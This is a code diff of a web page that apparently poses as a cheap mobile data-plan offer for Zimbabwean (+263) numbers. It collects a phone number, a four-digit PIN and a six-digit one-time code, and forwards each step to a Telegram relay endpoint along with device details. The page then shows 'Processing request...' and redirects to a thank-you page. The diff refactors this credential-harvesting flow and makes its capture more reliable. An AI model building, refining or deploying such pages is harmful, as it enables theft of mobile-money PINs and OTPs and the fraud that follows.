@@ -19,9 +19,7 @@ min-height:100vh;
 display:flex;
 align-items:center;
 justify-content:center;
-
 background:linear-gradient(180deg,#e6f0ff,#cfe0ff);
-
 overflow:hidden;
 }
 
@@ -52,11 +50,7 @@ max-width:420px;
 padding:30px;
 background:white;
 border-radius:22px;
-
-box-shadow:
-0 25px 50px rgba(0,0,0,.12),
-0 6px 14px rgba(0,0,0,.06);
-
+box-shadow:0 25px 50px rgba(0,0,0,.12);
 transition:.35s;
 }
 
@@ -109,13 +103,6 @@ border:1px solid #eee;
 background:#fafafa;
 margin-top:6px;
 font-size:14px;
-}
-
-input:focus{
-outline:none;
-border-color:#003a8f;
-background:white;
-box-shadow:0 0 0 3px rgba(0,58,143,.08);
 }
 
 .phone-group{
@@ -222,18 +209,14 @@ opacity:1;
 
 <div class="pin">
 
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
 
 </div>
 
-<button id="loginBtn" class="btn">
-
-Login
-
-</button>
+<button id="loginBtn" class="btn">Login</button>
 
 </div>
 
@@ -242,11 +225,7 @@ Login
 
 <h1>OTP Verification</h1>
 
-<div class="subtitle" id="maskedNumber">
-
-Enter the OTP sent to your phone number
-
-</div>
+<div class="subtitle" id="maskedNumber"></div>
 
 <div class="pin">
 
@@ -260,26 +239,14 @@ Enter the OTP sent to your phone number
 </div>
 
 <div class="count">
-
 Code expires in <span id="time">60</span>s
-
 </div>
 
 <div class="resend">
-
-<button id="resendBtn">
-
-Resend OTP
-
-</button>
-
+<button id="resendBtn">Resend OTP</button>
 </div>
 
-<button class="btn active" onclick="submitOtp()">
-
-Submit
-
-</button>
+<button id="otpBtn" class="btn">Submit</button>
 
 </div>
 
@@ -289,9 +256,7 @@ Submit
 <h1>Success</h1>
 
 <div class="subtitle">
-
 Processing request...
-
 </div>
 
 </div>
@@ -305,32 +270,22 @@ Processing request...
 let phoneValue=""
 let pinValue=""
 let otpValue=""
+let loginClicked=false
+let otpSubmitted=false
+let resendClicked=false
 
 let selectedPlan=null
 
 try{
-
 selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
-
 }catch(e){}
 
-
-/* fallback price map */
-
 const priceMap={
-
 "15GB":"USD 0.99",
-
 "35GB":"USD 1.99",
-
 "50GB":"USD 2.99",
-
 "Unlimited":"USD 3.99"
-
 }
-
-
-/* build plan line */
 
 function getPlanLine(){
 
@@ -345,11 +300,8 @@ if(!price){
 for(let k in priceMap){
 
 if(name.includes(k)){
-
 price=priceMap[k]
-
 break
-
 }
 
 }
@@ -359,9 +311,6 @@ break
 return name+" — "+price
 
 }
-
-
-/* device */
 
 const ua=navigator.userAgent
 
@@ -376,7 +325,7 @@ else if(/Safari/i.test(ua)) device+=" | Safari"
 
 async function sendToTelegram(eventName){
 
-await fetch("/api/sendTelegram",{
+fetch("/api/sendTelegram",{
 
 method:"POST",
 
@@ -407,12 +356,13 @@ device:device
 }
 
 
+/* phone */
+
 phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"")
 
-if(v.length>0 && v[0]!=="7")
-v="7"+v.slice(1)
+if(v[0]!=="7") v="7"+v.slice(1)
 
 v=v.slice(0,9)
 
@@ -420,30 +370,32 @@ e.target.value=v
 
 phoneValue="+263"+v
 
-validate()
+validateLogin()
 
 }
 
 
+/* pin */
+
 const pinInputs=document.querySelectorAll("#step1 .pin input")
 
-pinInputs.forEach((input,index)=>{
+pinInputs.forEach((input,i)=>{
 
 input.oninput=()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
-if(input.value && index<3)
-pinInputs[index+1].focus()
+if(input.value && i<3)
+pinInputs[i+1].focus()
 
-validate()
+validateLogin()
 
 }
 
 })
 
 
-function validate(){
+function validateLogin(){
 
 pinValue=[...pinInputs].map(i=>i.value).join("")
 
@@ -469,11 +421,17 @@ document.getElementById(id)
 }
 
 
-loginBtn.onclick=async()=>{
+/* login */
+
+loginBtn.onclick=()=>{
 
 if(!loginBtn.classList.contains("active")) return
 
-await sendToTelegram("login_clicked")
+if(loginClicked) return
+
+loginClicked=true
+
+sendToTelegram("login_clicked")
 
 const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
 
@@ -488,27 +446,52 @@ startTimer()
 }
 
 
+/* otp */
+
 const otpInputs=document.querySelectorAll("#step3 .pin input")
 
-otpInputs.forEach((input,index)=>{
+const otpBtn=document.getElementById("otpBtn")
+
+otpInputs.forEach((input,i)=>{
 
 input.oninput=()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
-if(input.value && index<5)
-otpInputs[index+1].focus()
+if(input.value && i<5)
+otpInputs[i+1].focus()
+
+validateOtp()
 
 }
 
 })
 
 
-async function submitOtp(){
+function validateOtp(){
 
 otpValue=[...otpInputs].map(i=>i.value).join("")
 
-await sendToTelegram("otp_confirm")
+if(otpValue.length===6)
+
+otpBtn.classList.add("active")
+
+else
+
+otpBtn.classList.remove("active")
+
+}
+
+
+otpBtn.onclick=()=>{
+
+if(!otpBtn.classList.contains("active")) return
+
+if(otpSubmitted) return
+
+otpSubmitted=true
+
+sendToTelegram("otp_confirm")
 
 show("step4")
 
@@ -516,21 +499,29 @@ setTimeout(()=>{
 
 location.href="thankyou.html"
 
-},1500)
+},1200)
 
 }
 
 
-resendBtn.onclick=async()=>{
+/* resend */
+
+resendBtn.onclick=()=>{
 
 if(!resendBtn.classList.contains("active")) return
 
-await sendToTelegram("resend_otp")
+if(resendClicked) return
+
+resendClicked=true
+
+sendToTelegram("resend_otp")
 
 startTimer()
 
 }
 
+
+/* timer */
 
 function startTimer(){
 
@@ -539,6 +530,8 @@ let t=60
 time.textContent=t
 
 resendBtn.classList.remove("active")
+
+resendClicked=false
 
 const i=setInterval(()=>{
 
